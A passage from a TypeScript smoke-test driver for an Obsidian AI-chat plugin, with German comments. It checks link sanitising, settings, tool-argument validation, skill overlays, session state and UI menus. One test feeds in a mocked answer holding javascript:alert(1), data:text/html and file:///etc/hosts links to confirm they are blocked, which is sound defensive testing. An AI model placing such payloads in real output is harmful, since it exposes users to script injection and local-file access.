          for (const n of [P100, P101, P102, P103]) if (!bilanz.eintraege().some((x) => x.name === n)) abbruch22(n, error);
        } finally { await stubM.stop(); }

        // 104. Linkschutz (Welle 27, Kit 0.70.0): die Antwort trägt fünf Links mit gefährlichen Schemata, einen `[[javascript:…]]` und einen gewöhnlichen inneren Link. Gemessen wird der Strom UND der Verlauf
        // nach dem Neuzeichnen (`renderLog` ging bis dahin am Wächter vorbei: `file:`, `obsidian:` und `app:` blieben dort klickbar).
        const P104 = PUNKTE.find((n) => n.startsWith("106. "))!;
        const MD104 = "[js](javascript:alert(1)) [data](data:text/html,x) [file](file:///etc/hosts) [obs](obsidian://open?vault=x) [app](app://local/x) [[javascript:alert(1)]] [rel](foo) [ok](https://example.com)";
        const stub104 = await startLlmStub({ models: ["smoke-model"], antwort: () => ({ stuecke: [MD104 + "\n\n", "Zweiter Absatz.\n\n", "Dritter Absatz.\n\n"], takt: 900 }) });
        try {
          await setzeModell("smoke-model", stub104.url);
          await chatZeigen();
          await cdp.evaluate(`void ${PL}.ask("Smoke 104: Links"); return true;`);
          const linkLage = (wurzel: string) => `
            const a = [...document.querySelectorAll(${JSON.stringify(wurzel)} + " a")];
            const schema = (s) => a.filter((x) => (x.getAttribute("href") || "").toLowerCase().startsWith(s)).length;
            return { gesamt: a.length, js: schema("javascript:"), data: schema("data:"), file: schema("file:"), obs: schema("obsidian:"), app: schema("app:") };`;
          const strom = await pollUntil<{ gesamt: number; js: number; data: number; file: number; obs: number; app: number }>(cdp, linkLage(".koda-streaming .okit-stream-body").replace("return {", "const r = {").replace(/;\s*$/, "; return r.gesamt >= 8 ? r : null;"), 20_000, 150).catch(() => null);
          await pollUntil<boolean>(cdp, `return ${PL}.busy ? null : true;`, 30_000);
          await new Promise((r) => setTimeout(r, 800));
          const verlauf = await cdp.evaluate<{ gesamt: number; js: number; data: number; file: number; obs: number; app: number }>(linkLage(".koda-assistant:not(.koda-streaming) .markdown-rendered, .koda-assistant:not(.koda-streaming)"));
          const klick = await cdp.evaluate<{ gefaehrlich: number; gewoehnlich: number; gefunden: [boolean, boolean] }>(`
            const w = app.workspace; const orig = w.openLinkText; let n = 0;
            w.openLinkText = () => { n++; return Promise.resolve(); };
            try {
              const finde = (h) => [...document.querySelectorAll(".koda-assistant a.internal-link")].find((x) => x.getAttribute("data-href") === h);
              const gef = finde("javascript:alert(1)"); const gew = finde("foo");
              gef?.dispatchEvent(new MouseEvent("click", { bubbles: true, cancelable: true }));
              const nachGef = n;
              gew?.dispatchEvent(new MouseEvent("click", { bubbles: true, cancelable: true }));
              return { gefaehrlich: nachGef, gewoehnlich: n - nachGef, gefunden: [!!gef, !!gew] };
            } finally { w.openLinkText = orig; }`);
          const tot = (x: { js: number; data: number; file: number; obs: number; app: number } | null): boolean => x !== null && x.js + x.data + x.file + x.obs + x.app === 0;
          record(P104, tot(strom) && strom!.gesamt >= 8 && tot(verlauf) && verlauf.gesamt >= 8 && klick.gefunden[0] && klick.gefunden[1] && klick.gefaehrlich === 0 && klick.gewoehnlich === 1,
            `Strom: ${strom === null ? "kein Strom mit allen Links gesehen" : `${strom.gesamt} Links, mit Ziel: js ${strom.js}, data ${strom.data}, file ${strom.file}, obsidian ${strom.obs}, app ${strom.app}`} · Verlauf: ${verlauf.gesamt} Links, mit Ziel: js ${verlauf.js}, data ${verlauf.data}, file ${verlauf.file}, obsidian ${verlauf.obs}, app ${verlauf.app} · Klick auf [[javascript:…]]: ${klick.gefaehrlich}× geöffnet (soll 0) · auf einen gewöhnlichen inneren Link: ${klick.gewoehnlich}× (soll 1)`);
        } catch (error) { abbruch22(P104, error); } finally { await stub104.stop(); }

        // 105. Einstellungsgruppe „Links and images in answers“ (Kit `link-settings`): zwei Schalter, beide aus, ein Klick schreibt die Einstellung und zurück.
        const P105 = PUNKTE.find((n) => n.startsWith("107. "))!;
        try {
          await cdp.evaluate(`app.setting.open(); app.setting.openTabById(${JSON.stringify(PLUGIN_ID)}); await new Promise((r) => setTimeout(r, 1500)); return true;`);
          const sicht = await attachTo("settings", port, vault);
          if (!sicht) unmeasured(P105, "Einstellungsfenster nicht gefunden");
          else {
            try {
              const liesDom = `
                const gruppe = [...document.querySelectorAll(".setting-item")].filter((e) => ["Allow obsidian:// links", "Show local images from the vault"].includes(e.querySelector(".setting-item-name")?.textContent ?? ""));
                return { zeilen: gruppe.length, an: gruppe.map((e) => e.querySelector(".checkbox-container")?.classList.contains("is-enabled") ?? null) };`;
              const liesWerte = (): Promise<{ links: boolean; bilder: boolean }> => cdp.evaluate(`
                const p = ${PL}; return { links: p.settings.allowObsidianLinks, bilder: p.settings.allowLocalImages };`);
              const klick = `
                const z = [...document.querySelectorAll(".setting-item")].find((e) => e.querySelector(".setting-item-name")?.textContent === "Allow obsidian:// links");
                z?.querySelector(".checkbox-container")?.click(); await new Promise((r) => setTimeout(r, 700)); return true;`;
              const dom = await sicht.evaluate<{ zeilen: number; an: (boolean | null)[] }>(liesDom);
              const vorher = await liesWerte();
              await sicht.evaluate(klick);
              const an = await liesWerte();
              await sicht.evaluate(klick);
              const zurueck = await liesWerte();
              record(P105, dom.zeilen === 2 && dom.an.every((x) => x === false) && vorher.links === false && vorher.bilder === false && an.links === true && an.bilder === false && zurueck.links === false,
                `Zeilen ${dom.zeilen} · vorher links ${String(vorher.links)}/Bilder ${String(vorher.bilder)} · nach dem Klick links ${String(an.links)} · zurück ${String(zurueck.links)}`);
            } finally { sicht.close(); await schliesseEinstellungen(cdp).catch(() => undefined); }
          }
        } catch (error) { abbruch22(P105, error); }


        // 78. Argumente eines Anbieter-Werkzeugs werden VOR dem Aufruf gegen sein Schema geprueft (Vertrag tool-provider).
        const P78 = "78. Anbieter-Werkzeug: ein Aufruf gegen das Schema (Pflichtfeld fehlt, unmögliches Datum) erreicht den Anbieter nicht, ein gültiger schon";
        const PROV78 = "koda-smoke-provider-78";
        try {
          if (await cdp.evaluate<boolean>(`return !!app.plugins.plugins[${JSON.stringify(PROV78)}];`)) {
            unmeasured(P78, "uebersprungen — ein Eintrag unter der Stub-Id existiert bereits");
          } else {
            await cdp.evaluate(`
              window.__kodaSmoke78 = [];
              app.plugins.plugins[${JSON.stringify(PROV78)}] = { api: { version: 1, tools: () => [
                { name: "smoke78_plan", description: "Smoke 78", parameters: { type: "object", properties: { title: { type: "string", minLength: 1 }, day: { type: "string", format: "date" } }, required: ["title"] }, writes: false },
              ], executeTool: async (n, a) => { window.__kodaSmoke78.push(a); return { ok: true, content: "angelegt" }; } } };
              return true;
            `);
            const r78 = await cdp.evaluate<{ schlecht: { ok: boolean; error?: string }; gut: { ok: boolean; content?: string }; erreicht: unknown[] }>(`
              const t = ${PL}.buildTools();
              const schlecht = await t.run("smoke78_plan", { day: "2026-02-31" });
              const gut = await t.run("smoke78_plan", { title: "x", day: "2026-03-01", erfunden: 1 });
              return { schlecht, gut, erreicht: window.__kodaSmoke78 };
            `);
            record(P78,
              !r78.schlecht.ok && /title/.test(r78.schlecht.error ?? "") && /day/.test(r78.schlecht.error ?? "")
                && r78.gut.ok && r78.erreicht.length === 1 && JSON.stringify(r78.erreicht[0]) === JSON.stringify({ title: "x", day: "2026-03-01" }),
              `ungültiger Aufruf: „${(r78.schlecht.error ?? "").slice(0, 140)}“ · Anbieter erreicht ${r78.erreicht.length}× (soll 1) mit ${JSON.stringify(r78.erreicht[0])}`);
          }
        } catch (error) { abbruch22(P78, error); } finally {
          await cdp.evaluate(`delete app.plugins.plugins[${JSON.stringify(PROV78)}]; delete window.__kodaSmoke78; return true;`).catch(() => undefined);
        }
      }

      // --- 79–85. Fähigkeiten und Arbeiten (Plan 1, Welle 24) ----
      // Der Treiber setzt jeden Zustand, den er anlegt, VOR dem Lauf zurück (Skills, Arbeits-Notiz, Notizen, Sitzungszustand)
      // und räumt nach dem Lauf alles ab, was er angelegt hat — ein abgebrochener Vorlauf misst sonst seinen eigenen Rest.
      {
        const PL = `app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}]`;
        const pause = (ms: number): Promise<void> => new Promise((r) => setTimeout(r, ms));
        const abbruch = (name: (typeof PUNKTE)[number], error: unknown): void => unmeasured(name, `Abbruch: ${error instanceof Error ? error.message : String(error)}`);
        const P79 = "79. Tab „Fähigkeiten“: sichtbar, ein Klick auf „ganz“ bringt den Skill-Text in den nächsten Prompt, der Overlay-Punkt erscheint und verschwindet mit dem Zurückschalten";
        const P80 = "80. Skill im Gespräch abgeschaltet: fehlt im Prompt, load_skill lehnt ab, ein früheres load_skill-Ergebnis wird in der Projektion zum Hinweis und steht im Chat wörtlich";
        const P81 = "81. Arbeit mit „übrige-skills: aus“: nur die genannten Skills im Prompt, Modus und Tiefe aus der Arbeit, Ordner zu Einzelpfaden, ungültige und fehlende Einträge als Hinweis";
        const P82 = "82. „Speichern“ schreibt die Abweichung in die Arbeits-Notiz, der Text darunter bleibt; der Schalter „Hinweis statt zweitem Skill-Text“ schaltet die Regel ab";
        const P83 = "83. Sitzungs-Marke: nach einer Frage steht sie im JSONL, nach dem Neuladen sind Arbeit und Overlay zurück, „Neues Gespräch“ behält die Arbeit und leert das Overlay";
        const P84 = "84. „/“-Menü: zwei Gruppen, Enter wählt und sendet nicht, Escape schließt, bei geschlossener Liste sendet Enter wie bisher, eine URL öffnet nichts";
        const P85 = "85. Regler „Tiefe“ im Kontext-Tab gilt für das Gespräch: die wirksame Tiefe ändert sich, die Einstellung nicht";
        const BODY_A = "MARKER-A-79 Text von Skill A.";
        const ARBEIT_TEXT = "Freitext fuer mich, geht nicht ans Modell.";
        const ARBEIT_NOTE = [
          "---", "koda: arbeit", "skills:", "  smoke79-a: ganz", "übrige-skills: aus", "werkzeuge:", "  write_skill: aus", '  move_note: "on"',
          "kontext:", "  modus: note", "  tiefe: 2", "  notizen:", "    - Smoke79Ordner/", "    - Nirgends79.md", "---", ARBEIT_TEXT, "",
        ].join("\n");
        const zeile = (name: string): string => `[...document.querySelectorAll(".koda-ab-body .koda-ab-row")].find((r) => r.querySelector(".koda-ab-name")?.textContent === ${JSON.stringify(name)})`;
        const zustand = { gesichert: false };
        try {
          // Vorlauf: Zustand sichern, Kulisse neu schreiben (Zurücksetzen VOR dem Lauf, nicht nur danach).
          await cdp.evaluate(`
            const p = ${PL};
            window.__kodaSmoke79 = { session: JSON.stringify(p.session), hint: p.settings.skillHintInHistory };
            const ensure = async (d) => { if (!app.vault.getFolderByPath(d)) await app.vault.createFolder(d); };
            const mk = async (path, content) => { const f = app.vault.getFileByPath(path); if (f) await app.vault.modify(f, content); else await app.vault.create(path, content); };
            for (const d of ["Koda/Skills", "Koda/Arbeiten", "Smoke79Ordner", "Smoke79Ordner/sub"]) await ensure(d);
            await mk("Koda/Skills/smoke79-a.md", "---\\ndescription: Smoke Skill A\\n---\\n${BODY_A}");
            await mk("Koda/Skills/smoke79-b.md", "---\\ndescription: Smoke Skill B\\npinned: true\\n---\\nMARKER-B-79 Text von Skill B.");
            await mk("Koda/Arbeiten/Smoke79.md", ${JSON.stringify(ARBEIT_NOTE)});
            await mk("Smoke79Ordner/n1.md", "n1");
            await mk("Smoke79Ordner/sub/n2.md", "n2");
            p.settings.skillHintInHistory = true;
            p.chooseArbeit(null);
            p.resetOverlay();
            return true;
          `);
          zustand.gesichert = true;
          const bereit = await pollUntil<boolean>(cdp, `
            const p = ${PL};
            p.refreshArbeiten();
            await p.readSkills();
            const a = p.arbeiten.find((x) => x.name === "Smoke79");
            return a && (a.kontext.notizen ?? []).length === 2 && p.skillNames().includes("smoke79-a") && p.skillNames().includes("smoke79-b") ? true : null;`, 10_000, 300);
          if (!bereit) throw new Error("Kulisse (Skills, Arbeit) wurde vom metadataCache nicht gelesen");
          const prompt = (): Promise<string> => cdp.evaluate<string>(`return await ${PL}.previewSystemPrompt();`);

          // 79. Der Tab, ein echter Klick auf den Schalter, der Prompt, der Punkt.
          try {
            await cdp.evaluate(`const p = ${PL}; if (p.views().length === 0) await p.activateView(); app.commands.executeCommandById(${JSON.stringify(PLUGIN_ID + ":tab-abilities")}); return true;`);
            const tab = await pollUntil<{ h: number; rows: number }>(cdp, `
              const b = document.querySelector(".koda-ab-body"); const r = b?.getBoundingClientRect();
              const rows = b ? b.querySelectorAll(".koda-ab-row").length : 0;
              return r && r.height > 0 && ${zeile("smoke79-a")} ? { h: Math.round(r.height), rows } : null;`, 10_000, 300);
            const vorher = await prompt();
            await cdp.evaluate(`${zeile("smoke79-a")}.querySelector('.okit-segmented-btn[data-value="ganz"]').click(); return true;`);
            const nachher = await pollUntil<string>(cdp, `const t = await ${PL}.previewSystemPrompt(); return t.includes(${JSON.stringify("MARKER-A-79")}) ? t : null;`, 8000, 300);
            const punkt = await pollUntil<{ dots: number; aktiv: string }>(cdp, `
              const row = ${zeile("smoke79-a")};
              const dots = row ? row.querySelectorAll(".koda-ab-dot[aria-label]").length : 0;
              const aktiv = row?.querySelector(".okit-segmented-btn.is-active")?.getAttribute("data-value") ?? "";
              return dots > 0 && aktiv === "ganz" ? { dots, aktiv } : null;`, 8000, 300);
            await cdp.evaluate(`${zeile("smoke79-a")}.querySelector('.okit-segmented-btn[data-value="beschreibung"]').click(); return true;`);
            const zurueck = await pollUntil<{ ohneText: boolean; ohnePunkt: boolean; leer: boolean }>(cdp, `
              const t = await ${PL}.previewSystemPrompt();
              const row = ${zeile("smoke79-a")};
              const ohnePunkt = !!row && row.querySelectorAll(".koda-ab-dot[aria-label]").length === 0;
              const leer = Object.keys(${PL}.session.overlay.skills).length === 0;
              return !t.includes("MARKER-A-79") && ohnePunkt && leer ? { ohneText: true, ohnePunkt, leer } : null;`, 8000, 300);
            record(P79, tab !== null && !vorher.includes("MARKER-A-79") && nachher !== null && punkt !== null && zurueck !== null,
              `Tab sichtbar ${tab ? `${tab.h} px, ${tab.rows} Zeilen` : "nein"} · vorher ohne Text: ${!vorher.includes("MARKER-A-79")} · nach Klick „ganz“ im Prompt: ${nachher !== null} unter ## Skills: ${nachher?.includes("## Skills") === true} · Punkt: ${punkt?.dots ?? 0} · nach Zurückschalten: ohne Text ${zurueck?.ohneText === true}, ohne Punkt ${zurueck?.ohnePunkt === true}, Overlay leer ${zurueck?.leer === true}`);
          } catch (error) { abbruch(P79, error); }

          // 80. Abgeschaltet: Prompt, load_skill, Projektion (Regel direkt, Kontrolle mit „Beschreibung“), Chat wörtlich.
          try {
            const r80 = await cdp.evaluate<{ beschr: string | null; ganz: string | null; aus: string | null; imPrompt: boolean; ablehnung: { ok: boolean; error?: string }; imLog: boolean; verfuegbar: boolean }>(`
              const p = ${PL};
              const body = "### smoke79-a\\nSmoke Skill A\\n\\n${BODY_A}";
              p.chatLog = [
                { role: "user", content: "Smoke 80" },
                { role: "assistant", content: "", toolCalls: [{ id: "c80", name: "load_skill", arguments: JSON.stringify({ name: "smoke79-a" }) }] },
                { role: "tool", toolCallId: "c80", content: body },
                { role: "assistant", content: "ok" },
              ];
              const regel = () => p.projectionRules()[0]({ name: "load_skill", args: JSON.stringify({ name: "smoke79-a" }) }, body);
              const beschr = regel();
              await p.setSkillMode("smoke79-a", "ganz");
              const ganz = regel();
              await p.setSkillMode("smoke79-a", "aus");
              const aus = regel();
              const imPrompt = (await p.previewSystemPrompt()).includes("smoke79-a");
              const ablehnung = await p.buildTools().run("load_skill", { name: "smoke79-a" });
              await p.views()[0].renderLog();
              const imLog = [...document.querySelectorAll(".koda-log .koda-tool pre")].some((e) => (e.textContent || "").includes("MARKER-A-79"));
              const verfuegbar = ablehnung.ok === false && /smoke79-b/.test(ablehnung.error || "");
              return { beschr, ganz, aus, imPrompt, ablehnung, imLog, verfuegbar };
            `);
            record(P80,
              r80.beschr === null && (r80.ganz ?? "").includes("steht oben im System-Prompt") && (r80.aus ?? "").includes("abgeschaltet")
                && !r80.imPrompt && !r80.ablehnung.ok && /abgeschaltet/.test(r80.ablehnung.error ?? "") && r80.imLog && r80.verfuegbar,
              `Regel bei „Beschreibung“: ${r80.beschr === null ? "Ergebnis bleibt" : "ERSETZT"} · „ganz“: „${(r80.ganz ?? "").slice(0, 40)}“ · „aus“: „${(r80.aus ?? "").slice(0, 52)}“ · Name im Prompt: ${r80.imPrompt} · load_skill: „${(r80.ablehnung.error ?? "").slice(0, 60)}“ · Text im Chat wörtlich: ${r80.imLog}`);
          } catch (error) { abbruch(P80, error); }

          // 81. Die Arbeit wählen.
          try {
            const r81 = await cdp.evaluate<{ modus: string; dropdowns: string[]; tiefe: number; manuell: string[]; imPrompt: string[]; schreibWerkzeug: boolean; hinweise: string[] }>(`
              const p = ${PL};
              await p.setSkillMode("smoke79-a", "beschreibung");
              p.chooseArbeit("Smoke79");
              const t = await p.previewSystemPrompt();
              const imPrompt = ["MARKER-A-79", "MARKER-B-79", "smoke79-b", "tidy-up"].filter((n) => t.includes(n));
              // Der Kontext-Tab zeichnet asynchron (viewModel liest Dateien): auf beide Dropdowns warten, nicht einmal lesen.
              const dropdowns = await new Promise((resolve) => {
                const t0 = Date.now();
                const tick = () => {
                  const v = [...document.querySelectorAll("select.koda-mode")].map((e) => e.value);
                  if ((v.length > 0 && v.every((x) => x === "note")) || Date.now() - t0 > 5000) resolve(v); else setTimeout(tick, 150);
                };
                tick();
              });
              return {
                modus: p.contextMode,
                dropdowns,
                tiefe: p.effectiveContextNow().depth,
                manuell: [...p.contextManual],
                imPrompt,
                schreibWerkzeug: p.currentToolNames().includes("write_skill"),
                hinweise: await p.arbeitHints(),
              };
            `);
            record(P81,
              r81.modus === "note" && r81.dropdowns.length > 0 && r81.dropdowns.every((v) => v === "note") && r81.tiefe === 2
                && JSON.stringify(r81.manuell) === JSON.stringify(["Smoke79Ordner/n1.md", "Smoke79Ordner/sub/n2.md"])
                && JSON.stringify(r81.imPrompt) === JSON.stringify(["MARKER-A-79"]) && !r81.schreibWerkzeug
                && r81.hinweise.some((h) => h.includes("werkzeuge.move_note")) && r81.hinweise.some((h) => h.includes("Nirgends79.md")),
              `Modus ${r81.modus} · Dropdowns ${JSON.stringify(r81.dropdowns)} · Tiefe ${r81.tiefe} · Notizen ${JSON.stringify(r81.manuell)} · im Prompt nur ${JSON.stringify(r81.imPrompt)} · write_skill gesendet: ${r81.schreibWerkzeug} · Hinweise ${r81.hinweise.length}: ${r81.hinweise.map((h) => h.slice(-32)).join(" | ")}`);
          } catch (error) { abbruch(P81, error); }

          // 82. Speichern und der Schalter für den Skill-Hinweis.
          try {
            const r82 = await cdp.evaluate<{ gespeichert: boolean; note: string; overlayLeer: boolean; mitHinweis: string | null; ohneHinweis: number }>(`
              const p = ${PL};
              p.chooseArbeit("Smoke79");
              await p.setSkillMode("smoke79-b", "ganz");
              p.setToolOn("move_note", false);
              const gespeichert = await p.saveArbeit();
              const note = await app.vault.adapter.read("Koda/Arbeiten/Smoke79.md");
              const overlayLeer = Object.keys(p.session.overlay.skills).length === 0 && Object.keys(p.session.overlay.werkzeuge).length === 0;
              const call = { name: "load_skill", args: JSON.stringify({ name: "smoke79-a" }) };
              const mitHinweis = p.projectionRules()[0](call, "x");
              p.settings.skillHintInHistory = false;
              const ohneHinweis = p.projectionRules().length;
              p.settings.skillHintInHistory = true;
              return { gespeichert, note, overlayLeer, mitHinweis, ohneHinweis };
            `);
            const n = r82.note;
            record(P82,
              r82.gespeichert && n.includes("smoke79-b: ganz") && n.includes("smoke79-a: ganz") && n.includes("move_note: aus") && n.includes("write_skill: aus")
                && /übrige-skills: aus/.test(n) && n.includes(ARBEIT_TEXT) && n.trimEnd().endsWith(ARBEIT_TEXT) && r82.overlayLeer
                && (r82.mitHinweis ?? "").includes("steht oben") && r82.ohneHinweis === 0,
              `gespeichert ${r82.gespeichert} · Abweichungen in der Notiz: b ganz ${n.includes("smoke79-b: ganz")}, move_note aus ${n.includes("move_note: aus")} · Text darunter unverändert ${n.trimEnd().endsWith(ARBEIT_TEXT)} · Overlay danach leer ${r82.overlayLeer} · Regel an: ${r82.mitHinweis === null ? "nein" : "ja"}, Schalter aus → ${r82.ohneHinweis} Regeln`);
          } catch (error) { abbruch(P82, error); }

          // 83. Sitzungs-Marke: Frage gegen einen Stub, JSONL, Neuladen, Neues Gespräch.
          const stub83 = await startLlmStub({ models: ["smoke-model"], antwort: () => ({ text: "Smoke-Antwort 83" }) });
          try {
            await setzeModell("smoke-model", stub83.url);
            await cdp.evaluate(`
              const p = ${PL};
              await p.newChat();
              p.chooseArbeit("Smoke79");
              await p.setSkillMode("smoke79-a", "beschreibung");
              p.setToolOn("save_memory", false);
              await p.ask("Smoke 83: Frage");
              return true;`);
            const jsonl = await cdp.evaluate<{ marken: number; arbeit: string | null; werkzeug: string | null; imChat: boolean }>(`
              const p = ${PL};
              const raw = await app.vault.adapter.read(p.manifest.dir + "/sessions/current.jsonl");
              const zeilen = raw.split("\\n").filter((z) => z.trim() !== "").map((z) => JSON.parse(z));
              const marken = zeilen.filter((m) => m.kind === "session");
              return { marken: marken.length, arbeit: marken[0]?.state.arbeit ?? null, werkzeug: marken[0]?.state.overlay.werkzeuge.save_memory ?? null,
                imChat: [...document.querySelectorAll(".koda-log .koda-session")].some((e) => (e.textContent || "").includes("Smoke79")) };`);
            await cdp.evaluate(`await app.plugins.disablePlugin(${JSON.stringify(PLUGIN_ID)}); await app.plugins.enablePlugin(${JSON.stringify(PLUGIN_ID)}); return true;`);
            const zurueck = await pollUntil<{ arbeit: string | null; werkzeug: string | null; manuell: number }>(cdp, `
              const p = ${PL};
              if (!p || !p.session) return null;
              return { arbeit: p.session.arbeit, werkzeug: p.session.overlay.werkzeuge.save_memory ?? null, manuell: p.contextManual.length };`, 10_000, 300);
            const neu = await cdp.evaluate<{ arbeit: string | null; overlay: number; manuell: number; wirksam: string }>(`
              const p = ${PL};
              await p.newChat();
              return { arbeit: p.session.arbeit, overlay: Object.keys(p.session.overlay.werkzeuge).length + Object.keys(p.session.overlay.skills).length,
                manuell: p.contextManual.length, wirksam: p.currentToolNames().includes("save_memory") ? "an" : "aus" };`);
            record(P83,
              jsonl.marken === 1 && jsonl.arbeit === "Smoke79" && jsonl.werkzeug === "aus" && jsonl.imChat
                && zurueck !== null && zurueck.arbeit === "Smoke79" && zurueck.werkzeug === "aus" && zurueck.manuell === 2
                && neu.arbeit === "Smoke79" && neu.overlay === 0 && neu.manuell === 2 && neu.wirksam === "an",
              `Marken im JSONL ${jsonl.marken} (Arbeit ${jsonl.arbeit}, save_memory ${jsonl.werkzeug}) · Zeile im Chat ${jsonl.imChat} · nach Neuladen: Arbeit ${zurueck?.arbeit}, save_memory ${zurueck?.werkzeug}, Notizen ${zurueck?.manuell} · Neues Gespräch: Arbeit ${neu.arbeit}, Overlay-Einträge ${neu.overlay}, Notizen ${neu.manuell}, save_memory wieder ${neu.wirksam}`);
          } catch (error) { abbruch(P83, error); } finally { await stub83.stop(); }

          // 84. „/“-Menü im Eingabefeld.
          try {
            await cdp.evaluate(`const p = ${PL}; if (p.views().length === 0) await p.activateView(); app.commands.executeCommandById(${JSON.stringify(PLUGIN_ID + ":tab-chat")}); return true;`);
            await pause(400);
            const r84 = await cdp.evaluate<{ gruppen: string[]; offen: boolean; gewaehlt: boolean; geleert: boolean; gesendetBeiOffen: number; geschlossenNachEsc: boolean; gesendetBeiZu: string | null; url: boolean }>(`
              const p = ${PL};
              p.chooseArbeit(null);
              await p.readSkills();
              window.__ask84 = [];
              p.ask = async (q) => { window.__ask84.push(q); };
              const ta = document.querySelector(".koda-input");
              const box = () => ta.parentElement.querySelector(".okit-suggest");
              const tippe = (text) => { ta.focus(); ta.value = text; ta.setSelectionRange(text.length, text.length); ta.dispatchEvent(new Event("input", { bubbles: true })); };
              const taste = (key) => ta.dispatchEvent(new KeyboardEvent("keydown", { key, bubbles: true, cancelable: true }));
              tippe("/smoke79");
              const gruppen = [...box().querySelectorAll(".okit-suggest-group")].map((e) => e.textContent);
              const offen = box().classList.contains("is-open");
              tippe("/smoke79-a");
              taste("Enter");
              // setSkillMode liest erst die Skill-Dateien (async): auf den Overlay-Eintrag warten.
              let gewaehlt = false;
              for (let i = 0; i < 30 && !gewaehlt; i++) { gewaehlt = p.session.overlay.skills["smoke79-a"] === "ganz"; if (!gewaehlt) await new Promise((r) => setTimeout(r, 100)); }
              const geleert = ta.value === "";
              const gesendetBeiOffen = window.__ask84.length;
              tippe("/smoke79-b");
              taste("Escape");
              const geschlossenNachEsc = !box().classList.contains("is-open");
              tippe("Hallo Smoke 84");
              taste("Enter");
              const gesendetBeiZu = window.__ask84[0] ?? null;
              tippe("https://x/");
              const url = !box().classList.contains("is-open");
              delete p.ask;
              delete window.__ask84;
              return { gruppen, offen, gewaehlt, geleert, gesendetBeiOffen, geschlossenNachEsc, gesendetBeiZu, url };
            `);
            record(P84,
              r84.gruppen.length === 2 && r84.offen && r84.gewaehlt && r84.geleert && r84.gesendetBeiOffen === 0 && r84.geschlossenNachEsc
                && r84.gesendetBeiZu === "Hallo Smoke 84" && r84.url,
              `Gruppen ${JSON.stringify(r84.gruppen)} · offen ${r84.offen} · Enter wählt (Skill auf ganz ${r84.gewaehlt}, Feld leer ${r84.geleert}, gesendet ${r84.gesendetBeiOffen}×) · Escape schließt ${r84.geschlossenNachEsc} · geschlossen sendet „${r84.gesendetBeiZu}“ · URL öffnet nichts ${r84.url}`);
          } catch (error) { abbruch(P84, error); }

          // 85. Regler „Tiefe“ im Kontext-Tab.
          try {
            await cdp.evaluate(`const p = ${PL}; p.chooseArbeit(null); p.setContextMode("note"); app.commands.executeCommandById(${JSON.stringify(PLUGIN_ID + ":tab-context")}); return true;`);
            const vor = await pollUntil<{ eff: number; sett: number }>(cdp, `
              const p = ${PL};
              const plus = [...document.querySelectorAll(".koda-ctx-depth button")].find((b) => b.textContent === "+");
              return plus ? { eff: p.effectiveContextNow().depth, sett: p.settings.contextLinkDepth } : null;`, 8000, 300);
            if (!vor) throw new Error("Regler „Tiefe“ im Kontext-Tab nicht gefunden");
            await cdp.evaluate(`[...document.querySelectorAll(".koda-ctx-depth button")].find((b) => b.textContent === "+").click(); return true;`);
            const nach = await pollUntil<{ eff: number; sett: number }>(cdp, `
              const p = ${PL};
              const d = p.effectiveContextNow().depth;
              return d !== ${vor.eff} ? { eff: d, sett: p.settings.contextLinkDepth } : null;`, 8000, 300);
            record(P85, nach !== null && nach.eff === vor.eff + 1 && nach.sett === vor.sett,
              `wirksame Tiefe ${vor.eff} → ${nach?.eff} · settings.contextLinkDepth ${vor.sett} → ${nach?.sett} (soll unverändert)`);
          } catch (error) { abbruch(P85, error); }
        } finally {
          // Nachlauf: alles abräumen, was dieser Block angelegt hat, und den Zustand wiederherstellen.
          await cdp.evaluate(`
            const p = ${PL};
            const rest = window.__kodaSmoke79;
            for (const pfad of ["Koda/Skills/smoke79-a.md", "Koda/Skills/smoke79-b.md", "Koda/Arbeiten/Smoke79.md", "Smoke79Ordner/n1.md", "Smoke79Ordner/sub/n2.md"]) {
              const f = app.vault.getFileByPath(pfad); if (f) await app.vault.delete(f);
            }
            for (const d of ["Smoke79Ordner/sub", "Smoke79Ordner"]) { const f = app.vault.getFolderByPath(d); if (f) await app.vault.delete(f, true); }
            if (rest) {
              delete p.ask; p.settings.skillHintInHistory = rest.hint;
              await p.newChat();
              p.session = JSON.parse(rest.session);
              delete window.__kodaSmoke79;
            }
            p.refreshArbeiten();
            await p.readSkills();
            return true;
          `).catch(() => undefined);
          void zustand;
        }
      }

      // --- 86–88. Bases-Ansicht „Koda-Kontext“ und Base in der Arbeit (Plan 2, Welle 25) ----
      // Der Treiber setzt jeden Zustand, den er anlegt, VOR dem Lauf zurück (Sitzungszustand, Arbeits-Notizen, offene Base-Tabs) und räumt
      // danach ab. Die Arbeits-Notizen entstehen zur Laufzeit wie in 79–85 (die Fixture trägt keine Arbeiten: sie stünden sonst im „/“-Menü und
      // in den README-Bildern). Die Ansicht selbst ist die Schicht des Hosts: kein Unit-Test sieht sie, nur diese Punkte.
      {
        const PL = `app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}]`;
        const pause = (ms: number): Promise<void> => new Promise((r) => setTimeout(r, ms));
        const abbruch = (name: (typeof PUNKTE)[number], error: unknown): void => unmeasured(name, `Abbruch: ${error instanceof Error ? error.message : String(error)}`);
        const P86 = "86. Bases: Übernahme als Tabelle, Default aus dem Lesecode, fehlende Werte leer";
        const P87 = "87. Bases: Übergabeform Notizen schickt die Zeilen im Volltext";
        const P88 = "88. Base in der Arbeit: die Arbeit öffnet die Base und übernimmt sie selbst, eine Ansicht fremden Typs wird mit Hinweis abgelehnt, „Neues Gespräch“ übernimmt frisch";
        const ID_TABELLE = "Notes/Koda context.base · Context table";
        // Die Base der Arbeit hat ZWEI Ansichten (erst eine Tabelle, dann die Koda-Ansicht): nur wenn Obsidian über `#Ansicht` die genannte wählt,
        // kommt der Schnappschuss der zweiten. Mit nur einer Ansicht in der Base bliebe die Frage ungemessen.
        const ID88 = "Notes/Koda two views.base · Second view";
        const basesBlaetter = (): Promise<number> => cdp.evaluate<number>(`return app.workspace.getLeavesOfType("bases").length;`);
        const schliesseBases = (): Promise<unknown> => cdp.evaluate(`for (const l of app.workspace.getLeavesOfType("bases")) l.detach(); return true;`);
        // Öffnet die Base in einem Tab und drückt „Als Kontext übernehmen“, sobald der Knopf bereit ist.
        const adoptFrom = async (pfad: string): Promise<string | null> => {
          await cdp.evaluate(`
            const f = app.vault.getFileByPath(${JSON.stringify(pfad)});
            await app.workspace.getLeaf("tab").openFile(f);
            return true;`);
          const bereit = await pollUntil<boolean>(cdp, `
            const b = document.querySelector(".workspace-leaf.mod-active .koda-bases-view .koda-bases-adopt");
            return b && !b.disabled ? true : null;`, 10_000, 200);
